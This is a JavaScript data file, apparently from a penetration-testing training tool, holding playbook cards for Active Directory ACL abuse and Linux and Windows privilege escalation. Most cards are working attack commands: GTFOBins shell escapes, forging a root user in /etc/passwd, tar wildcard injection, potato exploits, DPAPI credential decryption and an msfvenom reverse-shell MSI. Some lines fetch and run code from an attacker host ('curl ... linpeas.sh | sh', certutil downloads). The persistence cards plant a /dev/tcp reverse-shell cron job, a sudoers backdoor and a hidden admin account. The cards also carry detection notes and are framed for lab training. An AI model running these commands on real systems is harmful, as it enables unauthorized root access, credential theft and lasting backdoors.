}'},{tool:'powershell',run:'LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"',note:'SPN-bearing users = kerberoast targets, found without PowerView. Also try (adminCount=1) for protected/privileged accounts and (!(userAccountControl:1.2.840.113556.1.4.803:=2)) for enabled accounts only.'}],expected:['DC=','LDAP://','distinguishedname'],onFailure:{'Exception calling "FindAll"':{note:'Bad LDAP filter syntax — check parentheses balance and that you are in a domain context (RDP, not double-hopped WinRM).'}},defender:'DirectorySearcher generates ordinary LDAP queries to the DC — same traffic net.exe makes, hard to distinguish from admin activity.',report:{finding:'',severity:'informational'},tools:['powershell'],os:['windows']},

{id:'ad-acl-abuse',lane:'ad',title:'Object ACL Abuse (GenericAll and Friends)',hypothesis:'AD objects carry ACLs, and misconfigured ones are free privilege: GenericAll on a group means you can add yourself to it; ForceChangePassword on a user means you can reset their password; WriteDACL/WriteOwner means you can grant yourself everything. The interesting rights: GenericAll, GenericWrite, WriteOwner, WriteDACL, AllExtendedRights, ForceChangePassword, Self (add-self). Enumerate with PowerView from a foothold, convert SIDs to names, then act with plain net.exe. A regular user holding GenericAll on anything interesting is a misconfiguration and a finding.',prereq:{any:['foothold.windows','ad.attack_paths']},produces:['ad.control_paths','access.admin'],commands:[{tool:'powershell',run:'Get-ObjectAcl -Identity {{user}}',note:'ACEs applied to a specific object. The two fields that matter per ACE: ActiveDirectoryRights (what) and SecurityIdentifier (who holds it). ObjectSID is just the object you queried.'},{tool:'powershell',run:'Get-ObjectAcl -Identity "{{group}}" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights',note:'Who has full control over this group? Repeat with ForceChangePassword, WriteDACL, WriteOwner, AllExtendedRights. Sweep everything: Get-ObjectAcl | ? {$_.ActiveDirectoryRights -eq "GenericAll"} on each object of interest.'},{tool:'powershell',run:'Convert-SidToName S-1-5-21-...-1104',note:'Turn SecurityIdentifier SIDs into readable names. Batch it: "SID1","SID2" | Convert-SidToName. Domain Admins, Account Operators, SYSTEM are expected — a plain user is the anomaly.'},{tool:'cmd',run:'net group "{{group}}" {{user}} /add /domain',note:'Abuse GenericAll on a group: add yourself. Verify with Get-NetGroup "{{group}}" | select member. CLEAN UP AFTER: net group "{{group}}" {{user}} /del /domain — and record both in your notes.'},{tool:'powershell',run:'Set-DomainUserPassword -Identity {{user}} -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force) -Verbose',note:'Abuse ForceChangePassword/GenericAll on a USER: reset their password (PowerView). On engagements tell the client first; in labs, note the old state if known.'}],expected:['GenericAll','CORP\\','completed successfully'],onFailure:{'Access is denied':{note:'The right was read but the write still failed — recheck WHICH object you hold rights on (user vs group vs OU), and that you are in a full logon session, not a double-hopped one.'}},defender:'Event 4732/4728 (member added to group), 4724 (password reset), and ACL modification events (4662) — group adds by non-admins are prime hunting queries.',report:{finding:'Excessive AD Object Permissions (GenericAll/WriteDACL)',severity:'high'},tools:['powershell','cmd'],os:['windows'],refs:['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon','https://www.thehacker.recipes/ad/movement/dacl']},
]});

// Linux privilege escalation
window.OBOL_LANES.push({ lane:'linux-privesc', phase:'Privesc & Post-Exploitation', title:'Linux Privilege Escalation', version:0.1, cards:[

{id:'linux-enum',lane:'linux-privesc',title:'Local Enumeration Sweep',hypothesis:'Privesc is won by enumeration, not memory. Run a scanner (linpeas) for breadth, but read it with intent: you are looking for the ONE anomaly — a weird SUID, a writable path, a credential in a config — not reading the whole rainbow. Then verify manually before burning time on an exploit.',prereq:{any:['foothold.linux']},produces:['privesc.leads'],commands:[{tool:'linpeas',run:'curl -L http://{{lhost}}:8000/linpeas.sh | sh',note:'Serve from your box (mentor can host it). Pipe to tee to keep a local copy as evidence.'},{tool:'sh',run:'sudo -l && id && cat /etc/passwd | grep -E "sh$"',note:'The holy trinity: what can I sudo, who am I, who else exists.'},{tool:'sh',run:'find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null; ls -la /etc/cron*; crontab -l',note:'SUID, capabilities, cron — the three most common lab wins in one line.'}],expected:['SUID','NOPASSWD','cap_'],onFailure:{'nothing notable':{note:'Look again at: writable scripts run by root cron, NFS no_root_squash exports, credentials in web configs or bash history, and kernel version vs known CVEs (last resort).'}},defender:'linpeas touches everything; any EDR sees the process tree and file reads.',report:{finding:'Local Privilege Escalation Vector',severity:'high'},tools:['linpeas'],os:['linux'],refs:['https://github.com/peass-ng/PEASS-ng','https://github.com/rebootuser/LinEnum']},

{id:'sudo-abuse',lane:'linux-privesc',title:'sudo / GTFOBins Abuse',hypothesis:'sudo -l entries on common binaries are usually instant root: anything GTFOBins lists with a sudo section (vim, find, awk, tar, less, python...) has a documented shell escape. NOPASSWD entries are the gift-wrap.',prereq:{any:['foothold.linux']},produces:['access.root'],commands:[{tool:'sh',run:'sudo -l',note:'Read every entry. Cross-reference each binary against gtfobins.github.io.'},{tool:'sh',run:'sudo {{binary}} -c "!/bin/sh"',note:'Generic pattern; the exact escape depends on the binary — GTFOBins gives the precise command per tool.'}],expected:['NOPASSWD','(root)'],onFailure:{'not in sudoers':{note:'No sudo rights. Move to SUID, cron, and credential hunting.',card:'linux-enum'}},defender:'sudo executions log (Event: command run via sudo); escapes spawn shells from unusual parents.',report:{finding:'sudo Misconfiguration (GTFOBins)',severity:'critical'},tools:['sudo'],os:['linux'],refs:['https://gtfobins.github.io/']},

{id:'writable-passwd',lane:'linux-privesc',title:'Writable /etc/passwd',hypothesis:'If /etc/passwd is world-writable (it happens in labs more than you would think), you can append a new root-equivalent user with a password hash you generate locally. No exploit needed — the file IS the security boundary, and it is open.',prereq:{any:['foothold.linux','privesc.leads']},produces:['access.root'],commands:[{tool:'sh',run:'ls -la /etc/passwd',note:'Confirm the write bit. -rw-rw-rw- means go.'},{tool:'openssl',run:"openssl passwd {{password}}",note:'Generate the hash LOCALLY first.'},{tool:'sh',run:"echo 'r00t:HASH_FROM_OPENSSL:0:0:root:/root:/bin/bash' >> /etc/passwd",note:'Append the forged user, then: su r00t. Replace HASH_FROM_OPENSSL with your generated hash.'}],expected:['-rw-rw-rw-'],onFailure:{'Permission denied':{note:'Not actually writable — re-check the ls output; group-writable only helps if you are in that group.'}},defender:'File integrity monitoring on /etc/passwd is standard; a new UID-0 account is a critical alert.',report:{finding:'World-Writable /etc/passwd',severity:'critical'},tools:['openssl'],os:['linux']},

{id:'nfs-squash',lane:'linux-privesc',title:'NFS no_root_squash',hypothesis:'An NFS export with no_root_squash trusts remote root: mount it from your attacking position (or from a foothold), drop a SUID binary or a root-owned shell, and execute it as root on the target.',prereq:{any:['port:2049','foothold.linux']},produces:['access.root'],commands:[{tool:'showmount',run:'showmount -e {{target}}',note:'List exports; look for no_root_squash in /etc/exports on the foothold if you cannot see options directly.'},{tool:'sh',run:'mount -t nfs {{target}}:/share /mnt/nfs && cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash',note:'Plant a SUID bash on the share...'},{tool:'sh',run:'/share/bash -p',note:'...then run it on the target with -p to keep effective-root.'}],expected:['no_root_squash'],onFailure:{'root_squash':{note:'Squashed — files you write map to nobody. Look for other export misconfigurations or move on.'}},defender:'NFS mount logs and the appearance of root-owned foreign binaries.',report:{finding:'NFS no_root_squash Misconfiguration',severity:'high'},tools:['showmount','mount'],os:['linux']},

{id:'lxc-lxd-escape',lane:'linux-privesc',title:'LXC/LXD Group Escape',hypothesis:'Membership in the lxd group is passwordless root: lxd lets you create a privileged container, mount the host filesystem into it, and read/write anything as root. This is one of the most common intended privesc paths in HTB/0xdf boxes. If `id` shows lxd (or lxc), the box is already beaten — the rest is ceremony.',prereq:{any:['foothold.linux']},produces:['access.root'],commands:[{tool:'sh',run:'id',note:'Confirm lxd or lxc group membership before anything else.'},{tool:'lxc',run:'lxc image list',note:'If an image already exists, use it. If not, build one locally: clone lxc-alpine-builder, build alpine.tar.gz, transfer it, then `lxc image import alpine.tar.gz --alias alpine`.'},{tool:'lxc',run:'lxc init alpine privesc -c security.privileged=true',note:'Privileged container = container root is host root.'},{tool:'lxc',run:'lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true',note:'Mount the entire host filesystem into the container.'},{tool:'lxc',run:'lxc start privesc && lxc exec privesc /bin/sh',note:'Inside the container, /mnt/root is the host filesystem as root. Read flags, add users, done.'}],expected:['lxd','privileged'],onFailure:{'no images':{note:'No image and no network: build the alpine image on your own box and transfer it. Or fall back to other privesc leads.'}},defender:'lxd group membership IS root-equivalent; audit group membership. Container creation and mounts log via lxd.',report:{finding:'LXD Group Membership Grants Root',severity:'critical'},tools:['lxc'],os:['linux'],refs:['https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html']},

{id:'docker-socket',lane:'linux-privesc',title:'Docker Socket / docker Group Escape',hypothesis:'A writable /var/run/docker.sock (or docker group membership) is equivalent to root on the host: run a container with the host filesystem mounted and chroot in. Same logic as LXD, different daemon.',prereq:{any:['foothold.linux']},produces:['access.root'],commands:[{tool:'sh',run:'ls -la /var/run/docker.sock && id',note:'Socket writable by you, or docker group membership → game over.'},{tool:'docker',run:'docker images',note:'Pick any existing image to avoid network pulls.'},{tool:'docker',run:'docker run -v /:/mnt --rm -it {{image}} chroot /mnt sh',note:'Host filesystem at /mnt, as root. Substitute an image from docker images output.'}],expected:['docker','root'],onFailure:{'permission denied':{note:'Not in docker group and socket not writable — dead end, move to other leads.'}},defender:'docker group = root-equivalent; docker daemon API access is unauthenticated by design.',report:{finding:'Docker Socket Access Grants Root',severity:'critical'},tools:['docker'],os:['linux']},

{id:'suid-gtfobins',lane:'linux-privesc',title:'SUID Binary Abuse',hypothesis:'SUID binaries run as their owner (usually root). The system ones (su, sudo, mount) are fine — you are hunting the ANOMALY: a custom or unexpected binary with the SUID bit. Cross-reference anything unusual against GTFOBins; the corpus is full of boxes where find / -perm -4000 is the entire privesc.',prereq:{any:['foothold.linux']},produces:['access.root','privesc.leads'],commands:[{tool:'sh',run:'find / -perm -4000 -type f 2>/dev/null',note:'List all SUID binaries. Compare against the default set — anything non-standard is your lead.'},{tool:'sh',run:'find / -perm -g=s -o -perm -u=s -type f 2>/dev/null | xargs ls -la',note:'SUID + SGID with ownership details. SGID on interesting groups (adm → read /var/log, shadow → crack root).'}],expected:['-rwsr-xr-x'],onFailure:{'nothing unusual':{note:'SUID is clean — pivot to capabilities (getcap), sudo -l, cron, and process monitoring.'}},defender:'SUID on non-standard binaries is a finding by itself; audit with regular file-integrity scans.',report:{finding:'Exploitable SUID Binary',severity:'critical'},tools:['sh'],os:['linux'],refs:['https://gtfobins.github.io/']},

{id:'pspy-monitor',lane:'linux-privesc',title:'Process Monitoring (pspy)',hypothesis:'Cron jobs and timers run commands as root that you cannot see in /etc/crontab. pspy watches process creation WITHOUT root and reveals them: scripts with writable paths, commands leaking credentials in arguments, backup jobs you can hijack. When static enumeration stalls, watching the box breathe is the move — 0xdf reaches for pspy constantly.',prereq:{any:['foothold.linux']},produces:['privesc.leads','credential.candidate'],commands:[{tool:'pspy',run:'./pspy64 -pf -i 1000',note:'Serve pspy from your box (python3 -m http.server), wget it to /tmp or /dev/shm, chmod +x, run. -p shows processes, -f filesystem events, -i poll interval ms.'},{tool:'sh',run:'watch -n1 "ps aux | grep root | grep -v \\["',note:'Poor-man\'s pspy for short-window jobs. Root processes flashing by = scheduled task.'}],expected:['CMD','UID=0'],onFailure:{'nothing interesting':{note:'Give it 5-10 minutes — some jobs run on long cycles. Meanwhile, check systemd timers: systemctl list-timers.'}},defender:'None — passive observation of /proc.',report:{finding:'Scheduled Task Credential/Script Exposure',severity:'high'},tools:['pspy'],os:['linux'],refs:['https://github.com/DominicBreuker/pspy']},

{id:'cron-abuse',lane:'linux-privesc',title:'Cron Job Abuse and Tar Wildcards',hypothesis:'Two flavors: (1) a root cron job runs a script you can WRITE — edit it, wait, root. (2) A root job runs tar/rsync/chown with a WILDCARD in a directory you control — you cannot edit the command, but you can plant files whose NAMES inject options (tartarsauce: --checkpoint-action=exec). Wildcard injection is the trick nobody sees coming.',prereq:{any:['foothold.linux','privesc.leads']},produces:['access.root'],commands:[{tool:'sh',run:'cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers',note:'Enumerate jobs. For each script: can you write it? Is its directory writable? Does it use wildcards?'},{tool:'sh',run:"echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable-script.sh",note:'Writable root-run script: append a SUID dropper, wait for the cycle, run /tmp/rootbash -p.'},{tool:'sh',run:"cd /writable/backup/dir && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh' && echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > shell.sh",note:'Tar wildcard injection: filenames that ARE options. When root\'s tar -cf ... * runs, your checkpoint executes. Same trick works for rsync (--rsh) and chown (--reference).'}],expected:['root'],onFailure:{'nothing writable':{note:'Cron is clean — check pspy for hidden jobs, and look for PATH-relative commands in root scripts you can hijack via a writable earlier PATH directory.'}},defender:'Option-like filenames in monitored directories and SUID droppers in /tmp are strong IOCs.',report:{finding:'Cron Job Abuse Leading to Root',severity:'critical'},tools:['sh'],os:['linux'],refs:['https://gtfobins.github.io/']},

{id:'capabilities',lane:'linux-privesc',title:'Linux Capabilities Abuse',hypothesis:'Capabilities split root\'s powers — and misassigned ones are privesc: cap_setuid on python/perl = instant root shell, cap_dac_read_search = read any file (shadow), cap_sys_admin ≈ root. getcap finds them; GTFOBins has a capabilities section for each interpreter.',prereq:{any:['foothold.linux']},produces:['access.root','loot.files'],commands:[{tool:'sh',run:'getcap -r / 2>/dev/null',note:'List all file capabilities. Anything on an interpreter (python, perl, ruby, php, openssl, tcpdump) is a lead.'},{tool:'python3',run:"python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",note:'cap_setuid on python → root shell. Perl: perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";\''},{tool:'sh',run:'tcpdump -ni any -w /tmp/cap.pcap &',note:'cap_net_raw on tcpdump → sniff the wire from the foothold; creds in cleartext protocols land in your lap.'}],expected:['cap_setuid','cap_net_raw'],onFailure:{'no output':{note:'No capabilities set — normal. Move on to SUID/sudo/cron.'}},defender:'Unusual capability assignments are audit-able via getcap baselines.',report:{finding:'Dangerous Linux Capability Assignment',severity:'high'},tools:['python3'],os:['linux'],refs:['https://gtfobins.github.io/']},

{id:'linux-loot-hunt',lane:'linux-privesc',title:'Loot Hunting (Linux)',hypothesis:'Before exotic privesc, hunt loot: history files, config files with passwords, other users\' readable home dirs, /opt and /var backups, mail spools. The corpus turns up credentials in history files and configs constantly — and .bash_history symlinked to /dev/null is itself a hint that the author hid something elsewhere.',prereq:{any:['foothold.linux']},produces:['credential.candidate','loot.files'],commands:[{tool:'sh',run:"cat ~/.bash_history; ls -la /home/*/; cat /home/*/.bash_history 2>/dev/null",note:'History files: commands leak passwords passed as arguments, paths, other hosts.'},{tool:'sh',run:"grep -rniE 'passw|secret|token|api[_-]?key' /etc /opt /var/www /srv 2>/dev/null | grep -v Binary | head -50",note:'Config grep sweep. /var/www configs hold DB creds; /opt holds backup scripts with embedded passwords.'},{tool:'sh',run:"ls -la /var/mail/ /tmp /dev/shm /var/backups 2>/dev/null; find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.bak' 2>/dev/null | grep -v '^/proc'",note:'Mail spools (beep pattern), temp dirs, backups, key material, KeePass vaults.'}],expected:['password','BEGIN OPENSSH'],onFailure:{'nothing found':{note:'Clean box — move to pspy (processes leak args over time) and the SUID/sudo/cron cards.'}},defender:'Bulk grep of /etc and home dirs is noisy in auditd; mostly flies under casual logging.',report:{finding:'Credentials in Plaintext on Filesystem',severity:'high'},tools:['sh'],os:['linux'],refs:['https://github.com/peass-ng/PEASS-ng']},

{id:'linux-persistence',lane:'linux-privesc',title:'Linux Persistence (Post-Root)',hypothesis:'After root, leave a door that survives password resets and reboots — useful in long labs and when the exam lets you return. The quiet options: your SSH key in root\'s authorized_keys, a sudoers line for a low-priv user you control, or a cron callback. (Report everything you plant.)',prereq:{any:['access.root']},produces:['persist.linux'],commands:[{tool:'sh',run:"mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... your-public-key' >> /root/.ssh/authorized_keys",note:'The corpus standard (admirer, brainfuck, armageddon). Generate the keypair on YOUR box first: ssh-keygen -t ed25519.'},{tool:'sh',run:"echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",note:'Sudoers backdoor for a user you already control — survives root password changes.'},{tool:'sh',run:"echo '* * * * * root bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"' >> /etc/crontab",note:'Cron callback. Noisier; prefer keys when SSH is exposed.'}],expected:[''],onFailure:{'read-only filesystem':{note:'Container or hardened mount — persistence via /etc is out; try a writable service directory.'}},defender:'authorized_keys changes, sudoers edits, and new crontab lines are all prime audit items — document and clean up.',report:{finding:'Persistence Mechanism Planted',severity:'informational'},tools:['sh'],os:['linux'],refs:['https://gtfobins.github.io/']}
]});

// Windows privilege escalation
window.OBOL_LANES.push({ lane:'windows-privesc', phase:'Privesc & Post-Exploitation', title:'Windows Privilege Escalation', version:0.1, cards:[

{id:'windows-enum',lane:'windows-privesc',title:'Local Enumeration Sweep',hypothesis:'Same doctrine as Linux: breadth from a scanner (winpeas), judgment from you. The lab classics are service misconfigurations, stored credentials, unquoted paths, and token privileges. Run the scanner, then verify the specific lead manually before staging anything.',prereq:{any:['foothold.windows']},produces:['privesc.leads'],commands:[{tool:'winpeas',run:'certutil -urlcache -f http://{{lhost}}:8000/winPEASx64.exe wp.exe && wp.exe',note:'Serve from your box. cmd variant; use iwr in PowerShell sessions.'},{tool:'sh',run:'whoami /all && systeminfo && net localgroup administrators',note:'Identity, patches (for kernel-CVE triage), and who already holds admin.'},{tool:'sh',run:'cmdkey /list && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',note:'Stored creds and autologon — free passwords more often than you would think.'}],expected:['SeImpersonatePrivilege','AlwaysInstallElevated','DefaultPassword'],onFailure:{'nothing notable':{note:'Re-check: scheduled tasks running as SYSTEM with writable binaries, writable service paths, unquoted service paths, and credential files (unattend.xml, web.config, .ssh on Win32-OpenSSH).'}},defender:'winpeas is signatured by every AV; in labs fine, in engagements use manual enumeration.',report:{finding:'Local Privilege Escalation Vector',severity:'high'},tools:['winpeas'],os:['windows'],refs:['https://github.com/peass-ng/PEASS-ng','https://lolbas-project.github.io/']},

{id:'seimpersonate',lane:'windows-privesc',title:'SeImpersonatePrivilege (Potato Family)',hypothesis:'Service accounts (IIS, MSSQL) almost always hold SeImpersonatePrivilege, which lets them capture a SYSTEM authentication and impersonate it — the entire potato family (GodPotato on modern Windows, PrintSpoofer, JuicyPotato on older). Prerequisite check first: SeImpersonate present, .NET version adequate, x64, writable staging directory.',prereq:{any:['foothold.windows']},produces:['access.system'],commands:[{tool:'sh',run:'whoami /priv | findstr /i impersonate',note:'Confirm SeImpersonatePrivilege before anything else.'},{tool:'sh',run:'certutil -urlcache -f http://{{lhost}}:8000/GodPotato-NET4.exe gp.exe',note:'Stage the binary you chose (served from your box). GodPotato covers Win10/11/Server 2012+; older targets want JuicyPotato.'},{tool:'sh',run:'gp.exe -cmd "cmd /c whoami > C:\\Windows\\Temp\\proof.txt"',note:'Prove SYSTEM first with a benign write, read it back, then run your real payload/reverse command.'}],expected:['SeImpersonatePrivilege','nt authority\\system'],onFailure:{'privilege not held':{note:'No SeImpersonate — potatoes are dead on this account. Move to service misconfigs and stored creds.',card:'windows-enum'},'antivirus blocked':{note:'Try the in-memory/alternate builds (SweetPotato via execute-assembly) or a different potato variant.'}},defender:'Process lineage (service spawning cmd/system), named pipe creation patterns, and the dropped binary are all signatured.',report:{finding:'SeImpersonatePrivilege Abuse (Potato)',severity:'critical'},tools:['godpotato'],os:['windows'],refs:['https://github.com/BeichenDream/GodPotato','https://lolbas-project.github.io/']},

{id:'unquoted-service-path',lane:'windows-privesc',title:'Unquoted Service Path',hypothesis:'A service binary path with spaces and no quotes (C:\\Program Files\\My App\\svc.exe) makes Windows try C:\\Program.exe, then C:\\Program Files\\My.exe, in order. If any directory in the chain is writable by you, drop an executable with the right name and restart the service (or wait for reboot).',prereq:{any:['foothold.windows','privesc.leads']},produces:['access.system'],commands:[{tool:'sh',run:'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\" | findstr /i /v \'"\'',note:'Find auto-start services with unquoted paths outside C:\\Windows.'},{tool:'sh',run:'icacls "C:\\Program Files\\My App"',note:'Verify you can write into the vulnerable directory before staging anything.'}],expected:['BUILTIN\\Users:(W)','(F)'],onFailure:{'access denied on write':{note:'Directory not writable by your user. Check every directory in the path chain, not just the last one.'}},defender:'New executables in Program Files roots and service binary path anomalies.',report:{finding:'Unquoted Service Path',severity:'high'},tools:['wmic','icacls'],os:['windows'],refs:['https://lolbas-project.github.io/']},

{id:'weak-service-permissions',lane:'windows-privesc',title:'Weak Service Permissions / Binary Replacement',hypothesis:'If you can modify a service configuration (SERVICE_CHANGE_CONFIG) or write to the binary it runs, you control what runs as SYSTEM on next start. accesschk finds them; then point binpath at your command or replace the binary.',prereq:{any:['foothold.windows','privesc.leads']},produces:['access.system'],commands:[{tool:'accesschk',run:'accesschk.exe -uwcqv {{user}} * /accepteula',note:'Services your account can reconfigure.'},{tool:'sh',run:'sc config {{service}} binpath= "net localgroup administrators {{user}} /add"',note:'Point the service at a benign-but-decisive command, then: sc stop/start (or wait for reboot if you lack stop rights).'},{tool:'sh',run:'icacls "C:\\path\\to\\service.exe"',note:'Alternate: if the binary itself is writable, back it up and replace it with your payload.'}],expected:['SERVICE_CHANGE_CONFIG','(F)'],onFailure:{'access denied on start':{note:'You can configure but not start the service. Note it and wait for a reboot, or find another service.'}},defender:'Event 7040 (service config change) and 7036; service binary replacement trips integrity monitoring.',report:{finding:'Weak Service Permissions',severity:'high'},tools:['accesschk','sc'],os:['windows'],refs:['https://lolbas-project.github.io/']},

{id:'alwaysinstallelevated',lane:'windows-privesc',title:'AlwaysInstallElevated',hypothesis:'If both HKLM and HKCU AlwaysInstallElevated are set to 1, any MSI you run installs as SYSTEM. Generate an MSI that adds an admin user or runs a command, install it, done.',prereq:{any:['foothold.windows','privesc.leads']},produces:['access.system'],commands:[{tool:'sh',run:'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',note:'BOTH must be 1. One without the other is nothing.'},{tool:'msfvenom',run:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o setup.msi',note:'Generate locally (the mentor can build this for you), upload, run: msiexec /i setup.msi /quiet'}],expected:['0x1'],onFailure:{'only one key set':{note:'Dead end — both keys required. Move on.',card:'windows-enum'}},defender:'MSI installs by non-admin users spawning SYSTEM processes.',report:{finding:'AlwaysInstallElevated Enabled',severity:'critical'},tools:['msfvenom','msiexec'],os:['windows'],refs:['https://lolbas-project.github.io/lolbas/Binaries/Msiexec/']},

{id:'dpapi-secrets',lane:'windows-privesc',title:'DPAPI Credential Decryption',hypothesis:'Windows stores saved credentials (RDP, scheduled tasks, browsers) encrypted with DPAPI masterkeys, which are themselves wrapped with the user\'s password hash. On boxes where you have a user\'s password (or are SYSTEM), the entire credential store decrypts — a reliable path to lateral credentials in the 0xdf corpus.',prereq:{all:['foothold.windows'],any:['credential.available','access.system']},produces:['credential.plaintext','credential.candidate'],commands:[{tool:'sh',run:'dir /a %APPDATA%\\Microsoft\\Credentials && dir /a %APPDATA%\\Microsoft\\Protect',note:'Find credential blobs and their masterkey GUIDs. Each blob names its masterkey in the file contents.'},{tool:'impacket-dpapi',run:"impacket-dpapi masterkey -file <masterkey-file> -sid <user-sid> -password '{{password}}'",note:'Unwrap the masterkey using the user\'s password. mimikatz dpapi::masterkey is the on-box equivalent.'},{tool:'impacket-dpapi',run:'impacket-dpapi credential -file <credential-blob> -key <unwrapped-masterkey-hex>',note:'Decrypt the blob with the unwrapped key. RDP creds, VPN creds, service passwords all surface here.'},{tool:'mimikatz',run:'mimikatz # dpapi::cred /in:C:\\Users\\{{user}}\\AppData\\Roaming\\Microsoft\\Credentials\\<blob>',note:'On-box variant when you are running as that user or SYSTEM.'}],expected:['Decrypted','user name','password'],onFailure:{'invalid masterkey':{note:'Wrong key or wrong user context — DPAPI keys are per-user; check the SID and whose password you used.'}},defender:'DPAPI access by other users and bulk masterkey retrievals from the DC (backup key) are detectable.',report:{finding:'Stored Credentials Recovered via DPAPI',severity:'high'},tools:['impacket-dpapi','mimikatz'],os:['windows'],refs:['https://www.thehacker.recipes/ad/movement/dpapi','https://lolbas-project.github.io/']},

{id:'stored-credentials',lane:'windows-privesc',title:'Stored Credential Hunting (Windows)',hypothesis:'Windows is a credential hoard: Credential Manager (cmdkey), autologon registry keys, unattend/sysprep answer files, saved RDP files, browser stores, and remote-connection managers (mRemoteNG config with decryptable passwords) all leak reusable creds. On lab boxes this sweep is short, scripted, and pays out constantly.',prereq:{any:['foothold.windows']},produces:['credential.candidate','credential.plaintext'],commands:[{tool:'sh',run:'cmdkey /list',note:'Saved credentials. If one exists: runas /savecred /user:{{user}} cmd.exe to use it without knowing the password.'},{tool:'sh',run:'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',note:'Autologon: DefaultUserName / DefaultPassword in cleartext.'},{tool:'sh',run:'dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul',note:'Answer files from imaging — local admin passwords in cleartext. Also check C:\\Windows\\Panther\\Unattend.xml.'},{tool:'sh',run:'dir /s %APPDATA%\\..\\*mRemoteNG*confCons.xml 2>nul && dir %USERPROFILE%\\*.rdp',note:'mRemoteNG configs hold encrypted-but-decryptable passwords (static key); .rdp files point at targets and usernames.'},{tool:'sh',run:'dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul',note:'Browser stores: DPAPI-protected — decrypt via SharpChrome or by copying Login Data + the Local State key offline.'}],expected:['DefaultPassword','Target:','confCons.xml'],onFailure:{'nothing found':{note:'Box is clean — rely on DPAPI card and winpeas output review. Also check PowerShell history: (Get-PSReadLineOption).HistorySavePath.'}},defender:'Credential Manager access and registry reads of Winlogon are monitorable; answer files should never survive imaging.',report:{finding:'Stored Credentials in Cleartext/Recoverable Form',severity:'high'},tools:['sh'],os:['windows'],refs:['https://lolbas-project.github.io/']},

{id:'wesng-patch-gaps',lane:'windows-privesc',title:'Missing-Patch Exploit Suggestions (wesng)',hypothesis:'Old Windows boxes (especially HTB-era 2008/2012/7) are often privesc\'d by a missing patch, not a misconfiguration. systeminfo output feeds Windows Exploit Suggester / wesng, which maps missing hotfixes to public exploits (MS16-032, MS15-051, Chimichurri...). This is the arctic/grandpa pattern: enumerate patches, match, exploit.',prereq:{any:['foothold.windows']},produces:['exploit.candidate','privesc.leads'],commands:[{tool:'sh',run:'systeminfo',note:'On the target. Save the full output locally: systeminfo > sysinfo.txt then transfer it back.'},{tool:'sh',run:'wesng sysinfo.txt',note:'On your box (pip install wesng; it auto-updates its database). Lists missing KBs mapped to public exploits, ranked.'},{tool:'sh',run:'python3 windows-exploit-suggester.py --update && python3 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt',note:'The classic alternative (corpus arctic). Older but battle-tested on 2008-era boxes.'}],expected:['Missing patches','Exploit'],onFailure:{'no exploits found':{note:'Fully patched for public exploits — misconfiguration route instead: services, tokens, stored creds.'}},defender:'None — analysis happens offline on your box.',report:{finding:'Missing Security Patches with Public Exploits',severity:'high'},tools:['wesng'],os:['windows'],refs:['https://github.com/bitsadmin/wesng']},

{id:'windows-persistence',lane:'windows-privesc',title:'Windows Persistence (Post-Admin)',hypothesis:'After admin/SYSTEM, leave a way back: a local admin user you control, a scheduled task, or a Run key. Labs rarely require it, but long engagements do — and it is a report-worthy finding about detection gaps. Document and remove everything you plant.',prereq:{any:['access.admin','access.system']},produces:['persist.windows'],commands:[{tool:'sh',run:"net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add",note:'Classic local-admin backdoor. Obvious in any user audit — fine for labs, loud in real environments.'},{tool:'sh',run:"schtasks /create /tn \"WindowsUpdateCheck\" /sc daily /st 09:00 /tr \"C:\\Windows\\Temp\\update.exe\" /ru SYSTEM",note:'Scheduled task running your binary as SYSTEM daily.'},{tool:'sh',run:"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\update.exe\"",note:'Run key — fires at next logon.'}],expected:['completed successfully'],onFailure:{'Access is denied':{note:'Not elevated — persistence is post-exploitation; get admin first.'}},defender:'All three are top-tier detections: new local admins, new scheduled tasks, Run-key writes.',report:{finding:'Persistence Mechanism Planted',severity:'informational'},tools:['sh'],os:['windows'],refs:['https://lolbas-project.github.io/']},

